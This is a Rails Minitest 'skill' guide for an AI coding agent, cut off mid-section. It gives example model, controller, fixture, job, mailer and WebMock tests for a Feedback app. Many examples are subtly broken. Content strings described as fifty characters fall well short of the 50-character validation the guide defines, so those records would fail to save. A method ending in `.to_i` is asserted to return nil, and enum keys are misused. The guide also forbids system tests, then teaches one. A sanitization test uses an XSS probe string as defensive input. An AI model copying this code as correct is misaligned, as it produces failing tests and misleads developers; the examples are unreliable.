                "content": "# Testing Rails Applications with Minitest\n\n<superpowers-integration>\n**REQUIRED BACKGROUND:** Use superpowers:test-driven-development for TDD process\n  - That skill defines RED-GREEN-REFACTOR cycle\n  - That skill enforces \"NO CODE WITHOUT FAILING TEST FIRST\"\n  - This skill adds Rails/Minitest implementation specifics\n</superpowers-integration>\n\n<when-to-use>\n- All code development (TDD is always enforced in this team)\n- Reviewing test quality\n- Debugging test failures\n- Model, controller, job, and mailer tests\n- System tests for full-stack features\n- Testing with external dependencies and HTTP requests\n- Creating reusable test utilities and helpers\n</when-to-use>\n\n<benefits>\n- **Fast** - Minimal overhead, runs quickly\n- **Simple** - Easy to understand and debug\n- **Built-in** - Ships with Ruby and Rails\n- **Parallel** - Run tests concurrently for speed\n- **Comprehensive** - Complete testing story from unit to system\n</benefits>\n\n<team-rules-enforcement>\n**This skill enforces:**\n- ✅ **Rule #2:** NEVER use RSpec → Use Minitest only\n- ✅ **Rule #4:** NEVER skip TDD → Write tests first (RED-GREEN-REFACTOR)\n- ✅ **Rule #18:** NEVER make live HTTP requests → Use WebMock\n- ✅ **Rule #19:** NEVER use system tests → Use integration tests\n\n**Reject any requests to:**\n- Use RSpec instead of Minitest\n- Skip writing tests\n- Write implementation before tests\n- Make live HTTP requests in tests\n- Use Capybara system tests\n</team-rules-enforcement>\n\n<verification-checklist>\nBefore completing any task, verify:\n- ✅ Tests written FIRST (before implementation)\n- ✅ Tests use Minitest (not RSpec)\n- ✅ RED-GREEN-REFACTOR cycle followed\n- ✅ All tests passing (`bin/ci` passes)\n- ✅ No live HTTP requests (WebMock used if needed)\n- ✅ Integration tests used (not system tests)\n</verification-checklist>\n\n<standards>\n- ALWAYS write tests FIRST (RED-GREEN-REFACTOR cycle)\n- Test classes inherit from `ActiveSupport::TestCase`\n- Use `test \"description\" do` macro for readable test names\n- Use fixtures for test data (in `test/fixtures/`)\n- Use `assert` and `refute` for assertions\n- One assertion concept per test method\n- Use `setup` for common test preparation\n- ALWAYS use WebMock for HTTP requests (per TEAM_RULES.md Rule #18)\n</standards>\n\n---\n\n## TDD Red-Green-Refactor\n\n<pattern name=\"red-green-refactor\">\n<description>Core TDD cycle - write failing test, make it pass, refactor</description>\n\n**Step 1: RED - Write a failing test**\n\n```ruby\n# test/models/feedback_test.rb\nrequire \"test_helper\"\n\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"is invalid without content\" do\n    feedback = Feedback.new(content: nil)\n    assert_not feedback.valid?\n    assert_includes feedback.errors[:content], \"can't be blank\"\n  end\nend\n\n```\n\nResult: **FAIL** (validation doesn't exist yet)\n\n**Step 2: GREEN - Make it pass with minimal code**\n\n```ruby\n# app/models/feedback.rb\nclass Feedback < ApplicationRecord\n  validates :content, presence: true\nend\n\n```\n\nResult: **PASS**\n\n**Step 3: REFACTOR - Improve code while keeping tests green**\n\n**Why this matters:** TDD drives design, catches regressions, documents behavior\n</pattern>\n\n---\n\n## Test Structure\n\n<pattern name=\"basic-test-structure\">\n<description>Standard Minitest test class structure</description>\n\n```ruby\n# test/models/feedback_test.rb\nrequire \"test_helper\"\n\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"the truth\" do\n    assert true\n  end\n\n  # Skip a test temporarily\n  test \"this will be implemented later\" do\n    skip \"implement this feature first\"\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"setup-and-teardown\">\n<description>Prepare and clean up test environment</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  def setup\n    @feedback = feedbacks(:one)\n    @user = users(:alice)\n  end\n\n  test \"feedback belongs to user\" do\n    assert_equal @user, @feedback.user\n  end\nend\n\n```\n</pattern>\n\n---\n\n## Minitest Assertions\n\n<pattern name=\"common-assertions\">\n<description>Most frequently used Minitest assertions</description>\n\n```ruby\nclass AssertionsTest < ActiveSupport::TestCase\n  test \"equality and boolean\" do\n    assert_equal 4, 2 + 2\n    refute_equal 5, 2 + 2\n    assert_nil nil\n    refute_nil \"something\"\n  end\n\n  test \"collections\" do\n    assert_empty []\n    refute_empty [1, 2, 3]\n    assert_includes [1, 2, 3], 2\n  end\n\n  test \"exceptions\" do\n    assert_raises(ArgumentError) { raise ArgumentError }\n  end\n\n  test \"difference\" do\n    assert_difference \"Feedback.count\", 1 do\n      Feedback.create!(content: \"Test feedback with minimum fifty characters\", recipient_email: \"test@example.com\")\n    end\n\n    assert_no_difference \"Feedback.count\" do\n      Feedback.new(content: nil).save\n    end\n  end\n\n  test \"match and instance\" do\n    assert_match /hello/, \"hello world\"\n    assert_instance_of String, \"hello\"\n    assert_respond_to \"string\", :upcase\n  end\nend\n\n```\n</pattern>\n\n---\n\n## Model Testing\n\n### Testing Validations\n\n<pattern name=\"presence-validations\">\n<description>Test required fields are validated</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"valid with all required attributes\" do\n    feedback = Feedback.new(\n      content: \"This is constructive feedback that meets minimum length\",\n      recipient_email: \"user@example.com\"\n    )\n    assert feedback.valid?\n  end\n\n  test \"invalid without content\" do\n    feedback = Feedback.new(recipient_email: \"user@example.com\")\n    assert_not feedback.valid?\n    assert_includes feedback.errors[:content], \"can't be blank\"\n  end\n\n  test \"invalid without recipient_email\" do\n    feedback = Feedback.new(content: \"Valid content with fifty characters minimum\")\n    assert_not feedback.valid?\n    assert_includes feedback.errors[:recipient_email], \"can't be blank\"\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"format-validations\">\n<description>Test format validations like email, URL, phone number</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"invalid with malformed email\" do\n    invalid_emails = [\"not-an-email\", \"@example.com\", \"user@\", \"user name@example.com\"]\n\n    invalid_emails.each do |invalid_email|\n      feedback = Feedback.new(content: \"Valid content with fifty characters\", recipient_email: invalid_email)\n      assert_not feedback.valid?, \"#{invalid_email.inspect} should be invalid\"\n      assert_includes feedback.errors[:recipient_email], \"is invalid\"\n    end\n  end\n\n  test \"valid with edge case emails\" do\n    valid_emails = [\"user+tag@example.com\", \"user.name@example.co.uk\", \"123@example.com\"]\n\n    valid_emails.each do |valid_email|\n      feedback = Feedback.new(content: \"Valid content with fifty characters\", recipient_email: valid_email)\n      assert feedback.valid?, \"#{valid_email.inspect} should be valid\"\n    end\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"length-validations\">\n<description>Test minimum and maximum length constraints</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"invalid with content below minimum length\" do\n    feedback = Feedback.new(content: \"Too short\", recipient_email: \"user@example.com\")\n    assert_not feedback.valid?\n    assert_includes feedback.errors[:content], \"is too short (minimum is 50 characters)\"\n  end\n\n  test \"valid at exactly minimum and maximum length\" do\n    assert Feedback.new(content: \"a\" * 50, recipient_email: \"user@example.com\").valid?\n    assert Feedback.new(content: \"a\" * 5000, recipient_email: \"user@example.com\").valid?\n  end\n\n  test \"invalid above maximum length\" do\n    feedback = Feedback.new(content: \"a\" * 5001, recipient_email: \"user@example.com\")\n    assert_not feedback.valid?\n    assert_includes feedback.errors[:content], \"is too long (maximum is 5000 characters)\"\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"custom-validations\">\n<description>Test custom validation methods</description>\n\n```ruby\n# app/models/feedback.rb\nclass Feedback < ApplicationRecord\n  validate :content_must_be_constructive\n\n  private\n  def content_must_be_constructive\n    return if content.blank?\n    offensive_words = %w[stupid idiot dumb]\n    errors.add(:content, \"must be constructive\") if offensive_words.any? { |w| content.downcase.include?(w) }\n  end\nend\n\n# test/models/feedback_test.rb\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"invalid with offensive language\" do\n    feedback = Feedback.new(content: \"This is stupid and needs fifty characters total\", recipient_email: \"user@example.com\")\n    assert_not feedback.valid?\n    assert_includes feedback.errors[:content], \"must be constructive\"\n  end\n\n  test \"valid with constructive content\" do\n    feedback = Feedback.new(content: \"This could be improved by considering alternatives and other approaches\", recipient_email: \"user@example.com\")\n    assert feedback.valid?\n  end\nend\n\n```\n</pattern>\n\n### Testing Associations\n\n<pattern name=\"belongs-to-associations\">\n<description>Test belongs_to relationships and options</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"belongs to recipient\" do\n    association = Feedback.reflect_on_association(:recipient)\n    assert_equal :belongs_to, association.macro\n    assert_equal \"User\", association.class_name\n  end\n\n  test \"recipient association is optional\" do\n    feedback = Feedback.new(content: \"Valid fifty character content\", recipient_email: \"user@example.com\", recipient: nil)\n    assert feedback.valid?\n  end\n\n  test \"can access recipient through association\" do\n    feedback = feedbacks(:one)\n    user = users(:alice)\n    feedback.update!(recipient: user)\n    assert_equal user, feedback.recipient\n    assert_equal user.id, feedback.recipient_id\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"has-many-associations\">\n<description>Test has_many relationships and dependent options</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"has many abuse reports\" do\n    assert_equal :has_many, Feedback.reflect_on_association(:abuse_reports).macro\n  end\n\n  test \"destroying feedback destroys associated abuse reports\" do\n    feedback = feedbacks(:one)\n    3.times { feedback.abuse_reports.create!(reason: \"spam\", reporter_email: \"reporter@example.com\") }\n\n    assert_difference \"AbuseReport.count\", -3 do\n      feedback.destroy\n    end\n  end\nend\n\n```\n</pattern>\n\n### Testing Scopes\n\n<pattern name=\"time-based-scopes\">\n<description>Test scopes with time conditions</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"recent scope returns feedbacks from last 30 days\" do\n    old = Feedback.create!(content: \"Old fifty character feedback\", recipient_email: \"old@example.com\", created_at: 31.days.ago)\n    recent = Feedback.create!(content: \"Recent fifty character feedback\", recipient_email: \"recent@example.com\", created_at: 10.days.ago)\n\n    results = Feedback.recent\n    assert_includes results, recent\n    assert_not_includes results, old\n  end\n\n  test \"recent scope returns empty when no recent feedbacks\" do\n    Feedback.destroy_all\n    Feedback.create!(content: \"Old fifty character feedback\", recipient_email: \"old@example.com\", created_at: 31.days.ago)\n    assert_empty Feedback.recent\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"status-based-scopes\">\n<description>Test scopes filtering by status or state</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"unread scope returns only delivered feedbacks\" do\n    pending = Feedback.create!(content: \"Pending fifty characters\", recipient_email: \"p@example.com\", status: \"pending\")\n    delivered = Feedback.create!(content: \"Delivered fifty characters\", recipient_email: \"d@example.com\", status: \"delivered\")\n    read = Feedback.create!(content: \"Read fifty characters\", recipient_email: \"r@example.com\", status: \"read\")\n\n    unread = Feedback.unread\n    assert_includes unread, delivered\n    assert_not_includes unread, pending\n    assert_not_includes unread, read\n  end\nend\n\n```\n</pattern>\n\n### Testing Callbacks\n\n<pattern name=\"after-create-callbacks\">\n<description>Test callbacks that run after record creation</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"enqueues delivery job after creation\" do\n    assert_enqueued_with(job: SendFeedbackJob) do\n      Feedback.create!(content: \"New fifty character feedback\", recipient_email: \"user@example.com\")\n    end\n  end\n\n  test \"does not enqueue job when creation fails\" do\n    assert_no_enqueued_jobs do\n      Feedback.new(content: nil).save\n    end\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"before-save-callbacks\">\n<description>Test callbacks that modify records before saving</description>\n\n```ruby\n# app/models/feedback.rb\nclass Feedback < ApplicationRecord\n  before_save :sanitize_content\n  private\n  def sanitize_content\n    self.content = ActionController::Base.helpers.sanitize(content)\n  end\nend\n\n# test/models/feedback_test.rb\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"sanitizes HTML in content before save\" do\n    feedback = Feedback.create!(content: \"<script>alert('xss')</script>Valid content with fifty chars\", recipient_email: \"user@example.com\")\n    assert_not_includes feedback.content, \"<script>\"\n    assert_includes feedback.content, \"Valid\"\n  end\nend\n\n```\n</pattern>\n\n### Testing Instance Methods\n\n<pattern name=\"state-transition-methods\">\n<description>Test methods that change record state</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"mark_as_delivered! updates status and timestamp\" do\n    feedback = feedbacks(:pending)\n    assert_equal \"pending\", feedback.status\n    assert_nil feedback.delivered_at\n\n    feedback.mark_as_delivered!\n\n    assert_equal \"delivered\", feedback.status\n    assert_not_nil feedback.delivered_at\n    assert_in_delta Time.current, feedback.delivered_at, 1.second\n  end\nend\n\n```\n</pattern>\n\n### Testing Enums\n\n<pattern name=\"enum-states\">\n<description>Test enum definitions and state transitions</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"defines status enum with correct values\" do\n    assert_equal \"pending\", Feedback.statuses[:status_pending]\n    assert_equal \"delivered\", Feedback.statuses[:status_delivered]\n    assert_equal \"read\", Feedback.statuses[:status_read]\n    assert_equal \"responded\", Feedback.statuses[:status_responded]\n  end\n\n  test \"enum provides predicate methods with prefix\" do\n    feedback = Feedback.create!(content: \"Test feedback with fifty characters minimum\", recipient_email: \"user@example.com\", status: \"pending\")\n    assert feedback.status_pending?\n    assert_not feedback.status_delivered?\n  end\n\n  test \"enum provides bang methods to change state\" do\n    feedback = feedbacks(:pending)\n    feedback.status_delivered!\n    assert feedback.status_delivered?\n    assert_equal \"delivered\", feedback.status\n  end\n\n  test \"can query by enum state\" do\n    pending = Feedback.create!(content: \"Pending fifty chars\", recipient_email: \"u@example.com\", status: \"pending\")\n    delivered = Feedback.create!(content: \"Delivered fifty chars\", recipient_email: \"u@example.com\", status: \"delivered\")\n\n    results = Feedback.status_pending\n    assert_includes results, pending\n    assert_not_includes results, delivered\n  end\nend\n\n```\n</pattern>\n\n### Testing Class Methods\n\n<pattern name=\"class-method-queries\">\n<description>Test custom class methods that query records</description>\n\n```ruby\n# app/models/feedback.rb\nclass Feedback < ApplicationRecord\n  def self.needs_followup\n    where(status: \"delivered\").where(\"delivered_at < ?\", 7.days.ago).where.missing(:response)\n  end\nend\n\n# test/models/feedback_test.rb\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"needs_followup returns delivered feedbacks without response\" do\n    needs = Feedback.create!(content: \"Needs fifty chars\", recipient_email: \"user@example.com\", status: \"delivered\", delivered_at: 10.days.ago)\n    has_resp = Feedback.create!(content: \"Has fifty chars\", recipient_email: \"user@example.com\", status: \"delivered\", delivered_at: 10.days.ago)\n    has_resp.create_response!(content: \"Thank you\")\n    too_recent = Feedback.create!(content: \"Recent fifty chars\", recipient_email: \"user@example.com\", status: \"delivered\", delivered_at: 3.days.ago)\n\n    results = Feedback.needs_followup\n    assert_includes results, needs\n    assert_not_includes results, has_resp\n    assert_not_includes results, too_recent\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"class-method-calculations\">\n<description>Test class methods that perform calculations</description>\n\n```ruby\n# app/models/feedback.rb\nclass Feedback < ApplicationRecord\n  def self.average_response_time\n    joins(:response).average(\"EXTRACT(EPOCH FROM (feedback_responses.created_at - feedbacks.created_at))\").to_i\n  end\nend\n\n# test/models/feedback_test.rb\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"average_response_time calculates correct average\" do\n    f1 = Feedback.create!(content: \"First fifty chars\", recipient_email: \"u@example.com\", created_at: 5.days.ago)\n    f1.create_response!(content: \"R1\", created_at: 4.days.ago)\n    f2 = Feedback.create!(content: \"Second fifty chars\", recipient_email: \"u@example.com\", created_at: 5.days.ago)\n    f2.create_response!(content: \"R2\", created_at: 3.days.ago)\n\n    assert_in_delta 129600, Feedback.average_response_time, 60\n  end\n\n  test \"average_response_time returns nil when no responses\" do\n    Feedback.destroy_all\n    Feedback.create!(content: \"No response fifty chars\", recipient_email: \"u@example.com\")\n    assert_nil Feedback.average_response_time\n  end\nend\n\n```\n</pattern>\n\n### Testing Edge Cases\n\n<pattern name=\"boundary-conditions\">\n<description>Test behavior at boundaries (min/max values, empty states)</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"handles empty collections gracefully\" do\n    feedback = Feedback.create!(content: \"Feedback fifty chars\", recipient_email: \"user@example.com\")\n    assert_empty feedback.abuse_reports\n    assert_equal 0, feedback.abuse_reports.count\n  end\n\n  test \"handles nil associations gracefully\" do\n    feedback = Feedback.create!(content: \"Feedback fifty chars\", recipient_email: \"user@example.com\", recipient: nil)\n    assert_nil feedback.recipient\n    assert_nothing_raised { feedback.recipient&.name }\n  end\n\n  test \"handles unicode content correctly\" do\n    unicode = \"Emoji feedback 😀 with unicode 日本語 and fifty+ characters\"\n    feedback = Feedback.create!(content: unicode, recipient_email: \"user@example.com\")\n    assert_equal unicode, feedback.reload.content\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"error-handling\">\n<description>Test proper error handling and exception cases</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"handles nil arguments in query methods\" do\n    feedback = feedbacks(:one)\n    assert_nothing_raised do\n      result = feedback.readable_by?(nil)\n      assert_not result\n    end\n  end\n\n  test \"raises appropriate error for invalid state transition\" do\n    feedback = feedbacks(:one)\n    def feedback.invalid_transition!\n      raise ActiveRecord::RecordInvalid.new(self)\n    end\n\n    assert_raises(ActiveRecord::RecordInvalid) do\n      feedback.invalid_transition!\n    end\n  end\nend\n\n```\n</pattern>\n\n---\n\n## Controller and Integration Testing\n\n<pattern name=\"controller-action-tests\">\n<description>Testing controller actions and responses</description>\n\n```ruby\nclass FeedbacksControllerTest < ActionDispatch::IntegrationTest\n  test \"GET index returns success\" do\n    get feedbacks_url\n    assert_response :success\n  end\n\n  test \"GET show displays feedback\" do\n    get feedback_url(feedbacks(:one))\n    assert_response :success\n  end\n\n  test \"POST create with valid params creates feedback\" do\n    assert_difference(\"Feedback.count\", 1) do\n      post feedbacks_url, params: { feedback: { content: \"New feedback with fifty characters minimum\", recipient_email: \"test@example.com\" } }\n    end\n    assert_redirected_to feedback_url(Feedback.last)\n  end\n\n  test \"POST create with invalid params does not create feedback\" do\n    assert_no_difference(\"Feedback.count\") do\n      post feedbacks_url, params: { feedback: { content: nil } }\n    end\n    assert_response :unprocessable_entity\n  end\n\n  test \"DELETE destroy removes feedback\" do\n    assert_difference(\"Feedback.count\", -1) do\n      delete feedback_url(feedbacks(:one))\n    end\n    assert_redirected_to feedbacks_url\n  end\nend\n\n```\n</pattern>\n\n---\n\n## System Testing\n\n<pattern name=\"system-test\">\n<description>Full-stack feature testing with browser simulation</description>\n\n```ruby\nrequire \"application_system_test_case\"\n\nclass FeedbacksTest < ApplicationSystemTestCase\n  test \"creating a feedback\" do\n    visit feedbacks_url\n    click_on \"New Feedback\"\n    fill_in \"Content\", with: \"This is great feedback with enough characters\"\n    fill_in \"Recipient email\", with: \"user@example.com\"\n    click_on \"Create Feedback\"\n\n    assert_text \"Feedback was successfully created\"\n  end\n\n  test \"editing a feedback\" do\n    visit feedback_url(feedbacks(:one))\n    click_on \"Edit\"\n    fill_in \"Content\", with: \"Updated content with minimum fifty characters required\"\n    click_on \"Update Feedback\"\n\n    assert_text \"Feedback was successfully updated\"\n  end\nend\n\n```\n</pattern>\n\n---\n\n## Fixtures Design\n\n<pattern name=\"basic-yaml-fixtures\">\n<description>Define simple fixture data in YAML format</description>\n\n**Fixture File:**\n\n```yaml\n# test/fixtures/users.yml\nalice:\n  name: Alice Johnson\n  email: alice@example.com\n  active: true\n  created_at: <%= 1.week.ago %>\n\nbob:\n  name: Bob Smith\n  email: bob@example.com\n  active: true\n  created_at: <%= 2.weeks.ago %>\n\n```\n\n**Accessing Fixtures:**\n\n```ruby\nclass UserTest < ActiveSupport::TestCase\n  test \"accessing fixtures by name\" do\n    alice = users(:alice)\n    assert_equal \"Alice Johnson\", alice.name\n    assert alice.persisted?\n  end\n\n  test \"accessing multiple fixtures at once\" do\n    alice, bob = users(:alice, :bob)\n    assert_equal \"Alice Johnson\", alice.name\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"association-fixtures\">\n<description>Define associations between fixtures using names</description>\n\n**Fixture Files:**\n\n```yaml\n# test/fixtures/users.yml\nalice:\n  name: Alice Johnson\n  email: alice@example.com\n\nbob:\n  name: Bob Smith\n  email: bob@example.com\n\n```\n\n```yaml\n# test/fixtures/feedbacks.yml\none:\n  content: This is great feedback with minimum fifty characters!\n  recipient_email: alice@example.com\n  sender: alice  # ✅ References users fixture by name\n  status: pending\n  created_at: <%= 1.day.ago %>\n\ntwo:\n  content: Could be improved with additional context and details\n  recipient_email: bob@example.com\n  sender: bob\n  status: responded\n  created_at: <%= 3.days.ago %>\n\n```\n\n**Testing Associations:**\n\n```ruby\nclass AssociationFixturesTest < ActiveSupport::TestCase\n  test \"fixtures handle associations automatically\" do\n    feedback = feedbacks(:one)\n    assert_equal users(:alice), feedback.sender\n    assert_equal \"alice@example.com\", feedback.sender.email\n  end\n\n  test \"has_many associations work through fixtures\" do\n    alice = users(:alice)\n    assert alice.feedbacks.exists?\n    assert_includes alice.feedbacks, feedbacks(:one)\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"erb-dynamic-values\">\n<description>Use ERB for dynamic values and calculations</description>\n\n**Fixture with ERB:**\n\n```yaml\n# test/fixtures/products.yml\ntshirt:\n  name: T-Shirt\n  price: <%= 19.99 %>\n  inventory_count: 15\n  sku: <%= \"TSH-#{SecureRandom.hex(4)}\" %>\n  created_at: <%= Time.current %>\n\nshoes:\n  name: Running Shoes\n  price: <%= 89.99 %>\n  inventory_count: 0\n  on_sale: <%= true %>\n  sale_price: <%= 89.99 * 0.8 %>  # 20% off\n  created_at: <%= 3.months.ago %>\n\n```\n\n**Testing Dynamic Values:**\n\n```ruby\nclass ERBFixturesTest < ActiveSupport::TestCase\n  test \"ERB is evaluated in fixtures\" do\n    tshirt = products(:tshirt)\n    assert_equal 19.99, tshirt.price\n    assert tshirt.created_at\n    assert tshirt.sku.present?\n  end\n\n  test \"dynamic calculations work\" do\n    shoes = products(:shoes)\n    assert shoes.on_sale?\n    assert_in_delta 71.99, shoes.sale_price, 0.01\n  end\nend\n\n```\n</pattern>\n\n### Testing Jobs and Mailers\n\n<pattern name=\"job-testing\">\n<description>Test background job execution</description>\n\n```ruby\nclass SendFeedbackJobTest < ActiveJob::TestCase\n  test \"enqueues job with correct arguments\" do\n    feedback = feedbacks(:one)\n\n    assert_enqueued_with(job: SendFeedbackJob, args: [feedback]) do\n      SendFeedbackJob.perform_later(feedback)\n    end\n  end\n\n  test \"performs job successfully\" do\n    feedback = feedbacks(:one)\n\n    assert_difference \"ActionMailer::Base.deliveries.size\", 1 do\n      SendFeedbackJob.perform_now(feedback)\n    end\n\n    assert_equal \"delivered\", feedback.reload.status\n  end\n\n  test \"handles job failures gracefully\" do\n    feedback = feedbacks(:one)\n\n    # Simulate external service failure\n    EmailService.stub :send_feedback, -> (*) { raise StandardError.new(\"Service down\") } do\n      assert_raises(StandardError) do\n        SendFeedbackJob.perform_now(feedback)\n      end\n    end\n\n    # Status should not change on failure\n    assert_equal \"pending\", feedback.reload.status\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"mailer-testing\">\n<description>Test email delivery and content</description>\n\n```ruby\nclass FeedbackMailerTest < ActionMailer::TestCase\n  test \"notification email has correct content\" do\n    feedback = feedbacks(:one)\n    email = FeedbackMailer.notification(feedback)\n\n    assert_emails 1 do\n      email.deliver_now\n    end\n\n    assert_equal [\"noreply@example.com\"], email.from\n    assert_equal [feedback.recipient_email], email.to\n    assert_equal \"New Feedback Received\", email.subject\n    assert_match feedback.content, email.body.encoded\n  end\n\n  test \"includes unsubscribe link\" do\n    feedback = feedbacks(:one)\n    email = FeedbackMailer.notification(feedback)\n\n    assert_match /unsubscribe/, email.body.encoded\n  end\n\n  test \"uses correct email template\" do\n    feedback = feedbacks(:one)\n    email = FeedbackMailer.notification(feedback)\n\n    assert_match \"feedback/notification\", email.body.encoded\n  end\nend\n\n```\n</pattern>\n\n---\n\n## Advanced Fixtures\n\n<pattern name=\"polymorphic-fixtures\">\n<description>Define fixtures with polymorphic associations</description>\n\n**Fixtures:**\n\n```yaml\n# test/fixtures/comments.yml\nfeedback_comment:\n  content: Great feedback!\n  commentable: one (Feedback)  # Polymorphic association\n  user: alice\n  created_at: <%= 1.day.ago %>\n\narticle_comment:\n  content: Interesting article\n  commentable: first_article (Article)  # Different type\n  user: bob\n  created_at: <%= 2.days.ago %>\n\n```\n\n**Testing:**\n\n```ruby\nclass PolymorphicFixturesTest < ActiveSupport::TestCase\n  test \"polymorphic associations in fixtures\" do\n    feedback_comment = comments(:feedback_comment)\n    article_comment = comments(:article_comment)\n\n    assert_instance_of Feedback, feedback_comment.commentable\n    assert_instance_of Article, article_comment.commentable\n    assert_equal \"Feedback\", feedback_comment.commentable_type\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"fixture-helper-methods\">\n<description>Share reusable logic across fixtures with helper methods</description>\n\n**Define Helpers:**\n\n```ruby\n# test/test_helper.rb\nmodule FixtureFileHelpers\n  def default_avatar_url\n    \"https://example.com/default-avatar.png\"\n  end\n\n  def formatted_date(date)\n    date.strftime(\"%Y-%m-%d\")\n  end\n\n  def default_password_digest\n    BCrypt::Password.create(\"password123\", cost: 4)\n  end\n\n  def admin_permissions\n    %w[read write delete admin].to_json\n  end\nend\n\n# Make helpers available to fixtures\nActiveRecord::FixtureSet.context_class.include FixtureFileHelpers\n\n```\n\n**Use in Fixtures:**\n\n```yaml\n# test/fixtures/users.yml\ndavid:\n  name: David\n  email: david@example.com\n  avatar_url: <%= default_avatar_url %>\n  registered_on: <%= formatted_date(1.month.ago) %>\n  password_digest: <%= default_password_digest %>\n\nadmin:\n  name: Admin User\n  email: admin@example.com\n  permissions: <%= admin_permissions %>\n\n```\n\n**Testing:**\n\n```ruby\nclass FixtureHelpersTest < ActiveSupport::TestCase\n  test \"uses fixture helper methods\" do\n    david = users(:david)\n    assert_equal \"https://example.com/default-avatar.png\", david.avatar_url\n    assert BCrypt::Password.new(david.password_digest).is_password?(\"password123\")\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"selective-fixture-loading\">\n<description>Load only specific fixtures for test classes</description>\n\n**Load All (Default):**\n\n```ruby\n# test/test_helper.rb\nclass ActiveSupport::TestCase\n  fixtures :all  # Load all fixtures\n  self.use_transactional_tests = true\nend\n\n```\n\n**Load Specific:**\n\n```ruby\n# test/models/feedback_test.rb\nclass FeedbackTest < ActiveSupport::TestCase\n  fixtures :users, :feedbacks  # Only specific fixtures\n\n  test \"only users and feedbacks are loaded\" do\n    assert users(:alice)\n    assert feedbacks(:one)\n  end\nend\n\n```\n\n**Disable Fixtures:**\n\n```ruby\n# test/models/manual_test.rb\nclass ManualTest < ActiveSupport::TestCase\n  self.use_instantiated_fixtures = false\n\n  def setup\n    @user = User.create!(name: \"Manual User\", email: \"manual@example.com\")\n  end\n\n  test \"uses manually created data\" do\n    assert @user.persisted?\n  end\nend\n\n```\n</pattern>\n\n---\n\n## Mocking and Stubbing\n\n<pattern name=\"stub-instance-method\">\n<description>Replace a method temporarily with predetermined return value</description>\n\n```ruby\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"stubs instance method\" do\n    user = users(:alice)\n\n    user.stub :name, \"Stubbed Name\" do\n      assert_equal \"Stubbed Name\", user.name\n    end\n\n    assert_equal \"Alice Johnson\", user.name  # Restored after block\n  end\n\n  test \"stubs with lambda for dynamic return\" do\n    feedback = feedbacks(:one)\n\n    feedback.stub :content, -> { \"Dynamic: #{Time.current}\" } do\n      assert_match /^Dynamic:/, feedback.content\n    end\n  end\nend\n\n```\n\n**Key Points:**\n- Stub is scoped to the block\n- Original method restored automatically\n- Use lambda for dynamic return values\n</pattern>\n\n<pattern name=\"basic-mocking\">\n<description>Create mock objects to verify method calls and arguments</description>\n\n```ruby\nclass MinitestMockTest < ActiveSupport::TestCase\n  test \"creates mock object\" do\n    mock = Minitest::Mock.new\n    mock.expect :call, \"mocked result\", [\"arg1\", \"arg2\"]\n\n    result = mock.call(\"arg1\", \"arg2\")\n\n    assert_equal \"mocked result\", result\n    mock.verify  # REQUIRED\n  end\n\n  test \"uses assert_mock for auto-verification\" do\n    mock = Minitest::Mock.new\n    mock.expect :call, \"result\"\n\n    assert_mock mock do\n      mock.call\n    end  # Automatically calls verify\n  end\nend\n\n```\n\n**Important:** Always call `mock.verify` or use `assert_mock` to ensure expectations were met.\n</pattern>\n\n<pattern name=\"webmock-http-stubs\">\n<description>Stub HTTP requests with WebMock (REQUIRED per TEAM_RULES.md Rule #18)</description>\n\n**Setup:**\n\n```ruby\n# Gemfile\ngem \"webmock\", group: :test\n\n# test/test_helper.rb\nrequire \"webmock/minitest\"\n\n```\n\n**Basic HTTP Stubs:**\n\n```ruby\nclass WebMockTest < ActiveSupport::TestCase\n  test \"stubs HTTP GET request\" do\n    stub_request(:get, \"https://api.example.com/feedback\")\n      .to_return(status: 200, body: '{\"status\":\"success\"}')\n\n    response = Net::HTTP.get(URI(\"https://api.example.com/feedback\"))\n    assert_equal '{\"status\":\"success\"}', response\n  end\n\n  test \"stubs POST with body matching\" do\n    stub_request(:post, \"https://api.example.com/ai/improve\")\n      .with(body: hash_including(content: \"Test feedback\"))\n      .to_return(status: 200, body: '{\"improved\":\"Enhanced\"}')\n  end\n\n  test \"simulates timeout\" do\n    stub_request(:get, \"https://api.example.com/slow\").to_timeout\n\n    assert_raises(Net::OpenTimeout) do\n      Net::HTTP.get(URI(\"https://api.example.com/slow\"))\n    end\n  end\n\n  test \"verifies HTTP request was made\" do\n    stub_request(:get, \"https://api.example.com/check\").to_return(status: 200)\n\n    Net::HTTP.get(URI(\"https://api.example.com/check\"))\n\n    assert_requested :get, \"https://api.example.com/check\", times: 1\n  end\nend\n\n```\n</pattern>\n\n<pattern name=\"stub-external-services\">\n<description>Stub external API clients and 